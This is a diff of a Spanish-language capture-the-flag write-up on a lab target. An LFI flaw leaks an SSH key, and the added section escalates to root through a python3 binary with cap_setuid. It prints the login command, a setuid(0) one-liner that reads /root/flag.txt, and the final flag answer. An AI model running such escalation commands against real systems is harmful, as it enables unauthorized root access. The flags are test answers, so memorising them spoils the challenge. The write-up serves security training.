@@ -4,7 +4,7 @@
 **Categoría:** LFI / exposición de clave SSH
 **Dificultad:** difícil (5 puntos)
 **Objetivo:** `172.17.0.2`
-**Estado:** resuelto a nivel de usuario
+**Estado:** resuelto
 
 ## Resumen
 
@@ -47,26 +47,42 @@ No se incluye la clave privada en el repositorio. Su huella observada fue:
 SHA256:RvqLLrL9nBRV94rH8Odoz0PNBTiRVNP3PEhuCTF5PM4
 ```
 
-## Flag
+## Escalada y flag final
 
 ```bash
 ssh -i vince -p 2222 vince@172.17.0.2
 cat ~/user.txt
 ```
 
-Resultado:
+La enumeración local mostró una capacidad peligrosa:
 
 ```text
-Whoami{y3ll0w_j4ck3t_w3b_p3n_t3st3r}
+/usr/bin/python3.9 cap_setuid=ep
 ```
 
-La cuenta no tenía permisos `sudo`, capacidades adicionales ni binarios SUID
-personalizados; no se observó una segunda flag de root en este escenario.
+La escalada se realizó con:
+
+```bash
+python3 -c 'import os; os.setuid(0); print(open("/root/flag.txt").read())'
+```
+
+Resultado del archivo:
+
+```text
+Whoami{th3_sting_0f_th3_r00t_888}
+```
+
+La respuesta que debe enviarse al validador es:
+
+```text
+YellowJacket{th3_sting_0f_th3_r00t_888}
+```
 
 ## Lección
 
 Un endpoint que pasa rutas controladas por el usuario a `readfile()` convierte
-todo archivo legible por el proceso web en una fuente de credenciales. Las claves
-privadas nunca deben estar expuestas ni siquiera con permisos de lectura
-aparentemente inocuos, y el acceso SSH debe restringirse con autorización y
-permisos correctos.
+todo archivo legible por el proceso web en una fuente de credenciales. Además,
+las capacidades Linux deben limitarse a binarios que realmente las necesiten:
+`cap_setuid` en un intérprete permite que cualquier usuario ejecute código como
+root. Las claves privadas nunca deben estar expuestas y el acceso SSH debe
+restringirse con autorización y permisos correctos.
